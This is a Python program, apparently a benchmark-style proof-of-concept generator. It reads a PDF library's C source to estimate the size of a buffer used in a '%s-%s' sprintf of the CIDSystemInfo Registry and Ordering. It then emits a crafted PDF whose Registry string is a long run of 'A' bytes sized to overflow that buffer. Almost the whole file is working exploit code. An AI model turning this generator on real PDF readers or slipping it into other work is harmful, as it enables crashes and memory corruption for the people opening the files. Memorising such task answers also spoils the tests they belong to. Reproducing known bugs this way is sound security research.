import os
import re
import ast
import tarfile
from typing import Dict, Optional, Tuple, Iterable, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        bufsize = self._infer_fallback_bufsize(src_path)
        if bufsize is None or bufsize <= 0:
            reg_len = 100000
        else:
            reg_len = min(max(bufsize + 16, 128), 200000)

        registry = b"A" * reg_len
        ordering = b"B"
        return self._build_pdf_poc(registry, ordering)

    def _build_pdf_poc(self, registry: bytes, ordering: bytes) -> bytes:
        def lit_string(b: bytes) -> bytes:
            # Using only 'A'/'B' bytes; safe in literal PDF strings.
            return b"(" + b + b")"

        content = b"BT /F1 12 Tf 10 10 Td (A) Tj ET\n"
        obj1 = b"<< /Type /Catalog /Pages 2 0 R >>"
        obj2 = b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>"
        obj3 = b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Resources << /Font << /F1 4 0 R >> >> /Contents 5 0 R >>"
        obj4 = b"<< /Type /Font /Subtype /Type0 /BaseFont /Dummy /Encoding /DoesNotExist /DescendantFonts [6 0 R] >>"
        obj5 = b"<< /Length " + str(len(content)).encode("ascii") + b" >>\nstream\n" + content + b"endstream"
        obj6 = (
            b"<< /Type /Font /Subtype /CIDFontType2 /BaseFont /Dummy"
            b" /CIDSystemInfo << /Registry " + lit_string(registry) +
            b" /Ordering " + lit_string(ordering) +
            b" /Supplement 0 >>"
            b" /FontDescriptor 7 0 R"
            b" /CIDToGIDMap /Identity"
            b" /DW 1000"
            b" >>"
        )
        obj7 = (
            b"<< /Type /FontDescriptor /FontName /Dummy /Flags 4"
            b" /FontBBox [0 0 0 0] /ItalicAngle 0 /Ascent 0 /Descent 0"
            b" /CapHeight 0 /StemV 0 >>"
        )

        objects = {
            1: obj1,
            2: obj2,
            3: obj3,
            4: obj4,
            5: obj5,
            6: obj6,
            7: obj7,
        }

        out = bytearray()
        out += b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        offsets = {0: 0}
        for i in range(1, 8):
            offsets[i] = len(out)
            out += str(i).encode("ascii") + b" 0 obj\n"
            out += objects[i] + b"\n"
            out += b"endobj\n"

        xref_off = len(out)
        out += b"xref\n"
        out += b"0 8\n"
        out += b"0000000000 65535 f \n"
        for i in range(1, 8):
            out += f"{offsets[i]:010d} 00000 n \n".encode("ascii")

        out += b"trailer\n"
        out += b"<< /Size 8 /Root 1 0 R >>\n"
        out += b"startxref\n"
        out += str(xref_off).encode("ascii") + b"\n"
        out += b"%%EOF\n"
        return bytes(out)

    def _infer_fallback_bufsize(self, src_path: str) -> Optional[int]:
        texts = self._iter_source_texts(src_path)

        candidate_files: List[Tuple[str, str]] = []
        defines: Dict[str, int] = {}

        max_files = 400
        max_total_bytes = 25_000_000
        total_bytes = 0

        for name, data in texts:
            if max_files <= 0 or total_bytes >= max_total_bytes:
                break
            max_files -= 1
            total_bytes += len(data)

            if "CIDSystemInfo" not in data or "Registry" not in data or "Ordering" not in data:
                continue

            candidate_files.append((name, data))
            self._update_defines(defines, data)

        if not candidate_files:
            return None

        # Try to find a direct sprintf/snprintf pattern that concatenates "%s-%s" etc.
        sizes = []
        for _, data in candidate_files:
            s = self._extract_bufsize_from_format_concat(data, defines)
            if s is not None:
                sizes.append(s)

        if sizes:
            return min(sizes)

        # Heuristic fallback: look for any char buffer declarations in relevant files and pick a reasonable small one.
        # This is a fallback when we can't match the destination variable.
        heuristic = self._heuristic_bufsize_from_related_buffers(candidate_files, defines)
        return heuristic

    def _iter_source_texts(self, src_path: str) -> Iterable[Tuple[str, str]]:
        if os.path.isdir(src_path):
            for root, _, files in os.walk(src_path):
                for fn in files:
                    if not self._is_source_name(fn):
                        continue
                    p = os.path.join(root, fn)
                    try:
                        st = os.stat(p)
                        if st.st_size > 2_000_000:
                            continue
                        with open(p, "rb") as f:
                            b = f.read()
                    except OSError:
                        continue
                    yield p, b.decode("latin-1", "ignore")
            return

        # Assume tarball
        try:
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    base = os.path.basename(m.name)
                    if not self._is_source_name(base):
                        continue
                    if m.size > 2_000_000:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        b = f.read()
                    except Exception:
                        continue
                    yield m.name, b.decode("latin-1", "ignore")
        except Exception:
            # If not a tarball, just try to read it as a single text
            try:
                with open(src_path, "rb") as f:
                    b = f.read()
                yield src_path, b.decode("latin-1", "ignore")
            except OSError:
                return

    def _is_source_name(self, name: str) -> bool:
        name = name.lower()
        return (
            name.endswith(".c") or name.endswith(".h") or name.endswith(".cc") or name.endswith(".cpp") or
            name.endswith(".hpp") or name.endswith(".cxx") or name.endswith(".hh") or
            name.endswith(".m") or name.endswith(".mm")
        )

    def _update_defines(self, defines: Dict[str, int], data: str) -> None:
        for m in re.finditer(r"(?m)^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+?)\s*(?:/\*.*\*/\s*)?$", data):
            name = m.group(1)
            expr = m.group(2).strip()
            if not expr:
                continue
            if "(" in expr and ")" in expr:
                # Keep; could be e.g. (256)
                pass
            try:
                v = self._eval_const(expr, defines)
            except Exception:
                continue
            if v is None:
                continue
            if -1_000_000_000 < v < 1_000_000_000:
                defines.setdefault(name, v)

    def _eval_const(self, expr: str, defines: Dict[str, int]) -> Optional[int]:
        expr = expr.strip()
        # Trim trailing comments
        expr = re.sub(r"//.*$", "", expr).strip()
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.DOTALL).strip()
        if not expr:
            return None

        # Common macro wrappers
        expr = expr.replace("UL", "").replace("U", "").replace("L", "")

        node = ast.parse(expr, mode="eval")

        def ev(n):
            if isinstance(n, ast.Expression):
                return ev(n.body)
            if isinstance(n, ast.Constant):
                if isinstance(n.value, (int, float)):
                    return int(n.value)
                return None
            if isinstance(n, ast.UnaryOp) and isinstance(n.op, (ast.UAdd, ast.USub, ast.Invert)):
                v = ev(n.operand)
                if v is None:
                    return None
                if isinstance(n.op, ast.UAdd):
                    return +v
                if isinstance(n.op, ast.USub):
                    return -v
                if isinstance(n.op, ast.Invert):
                    return ~v
            if isinstance(n, ast.BinOp) and isinstance(n.op, (ast.Add, ast.Sub, ast.Mult, ast.FloorDiv, ast.Div, ast.Mod, ast.LShift, ast.RShift, ast.BitOr, ast.BitAnd, ast.BitXor)):
                a = ev(n.left)
                b = ev(n.right)
                if a is None or b is None:
                    return None
                if isinstance(n.op, ast.Add):
                    return a + b
                if isinstance(n.op, ast.Sub):
                    return a - b
                if isinstance(n.op, ast.Mult):
                    return a * b
                if isinstance(n.op, (ast.Div, ast.FloorDiv)):
                    if b == 0:
                        return None
                    return a // b
                if isinstance(n.op, ast.Mod):
                    if b == 0:
                        return None
                    return a % b
                if isinstance(n.op, ast.LShift):
                    return a << b
                if isinstance(n.op, ast.RShift):
                    return a >> b
                if isinstance(n.op, ast.BitOr):
                    return a | b
                if isinstance(n.op, ast.BitAnd):
                    return a & b
                if isinstance(n.op, ast.BitXor):
                    return a ^ b
            if isinstance(n, ast.Name):
                return defines.get(n.id)
            if isinstance(n, ast.ParenExpr):  # type: ignore[attr-defined]
                return ev(n.expression)  # pragma: no cover
            return None

        return ev(node)

    def _extract_bufsize_from_format_concat(self, data: str, defines: Dict[str, int]) -> Optional[int]:
        # Search for calls like sprintf(buf, "%s-%s", ...)
        # or snprintf(buf, ..., "%s-%s", ...)
        # We only need buf and its declaration size.
        fmt_pos = [m.start() for m in re.finditer(r"\"%s\s*-\s*%s\"", data)]
        if not fmt_pos:
            fmt_pos = [m.start() for m in re.finditer(r"\"%s-%s\"", data)]
        if not fmt_pos:
            return None

        candidates = []
        call_re = re.compile(
            r"\b(?:sprint|snprint|fz_snprint|g_snprint)f\s*\(\s*([A-Za-z_]\w*)\s*,",
            re.MULTILINE
        )

        for mp in fmt_pos[:50]:
            window_start = max(0, mp - 300)
            window_end = min(len(data), mp + 80)
            window = data[window_start:window_end]

            # Find the nearest preceding function call in this window
            best = None
            for m in call_re.finditer(window):
                best = m
            if not best:
                continue
            dest = best.group(1)

            decl_size = self._find_declared_array_size(data, dest, defines)
            if decl_size is not None:
                candidates.append(decl_size)

        if candidates:
            return min(candidates)
        return None

    def _find_declared_array_size(self, data: str, var: str, defines: Dict[str, int]) -> Optional[int]:
        # Match patterns like: char var[256]; or unsigned char var[NAME_MAX+1];
        var_re = re.escape(var)
        m = re.search(r"\b(?:unsigned\s+)?char\s+" + var_re + r"\s*\[\s*([^\]\n]+)\s*\]", data)
        if not m:
            # also allow wchar_t / uint8_t in case it is used but typically char
            m = re.search(r"\b(?:signed\s+)?char\s+" + var_re + r"\s*\[\s*([^\]\n]+)\s*\]", data)
        if not m:
            return None

        expr = m.group(1).strip()
        # Strip common suffixes after expression (e.g. ) or comments
        expr = re.sub(r"\s*/\*.*?\*/\s*", "", expr, flags=re.DOTALL).strip()
        expr = re.sub(r"\s*//.*$", "", expr).strip()
        try:
            v = self._eval_const(expr, defines)
        except Exception:
            v = None
        if v is None:
            # Sometimes the bracket content has trailing tokens; try to isolate first token/expression segment
            expr2 = re.split(r"[;,]", expr, 1)[0].strip()
            try:
                v = self._eval_const(expr2, defines)
            except Exception:
                v = None
        if v is None:
            return None
        if 4 <= v <= 2_000_000:
            return int(v)
        return None

    def _heuristic_bufsize_from_related_buffers(self, candidate_files: List[Tuple[str, str]], defines: Dict[str, int]) -> Optional[int]:
        # Look for smallish stack buffers declared as char buf[...]; in functions dealing with CIDSystemInfo.
        sizes = []
        for _, data in candidate_files:
            # Narrow to chunks that mention Registry and Ordering to avoid irrelevant buffers.
            for m in re.finditer(r"CIDSystemInfo|Registry|Ordering", data):
                a = max(0, m.start() - 800)
                b = min(len(data), m.start() + 800)
                chunk = data[a:b]
                for dm in re.finditer(r"\b(?:unsigned\s+)?char\s+([A-Za-z_]\w*)\s*\[\s*([^\]\n]+)\s*\]", chunk):
                    expr = dm.group(2).strip()
                    try:
                        v = self._eval_const(expr, defines)
                    except Exception:
                        v = None
                    if v is None:
                        continue
                    if 8 <= v <= 262144:
                        sizes.append(int(v))
        if not sizes:
            return None
        # Prefer smaller sizes likely used for name buffers.
        sizes.sort()
        for v in sizes:
            if v <= 4096:
                return v
        return sizes[0] if sizes else None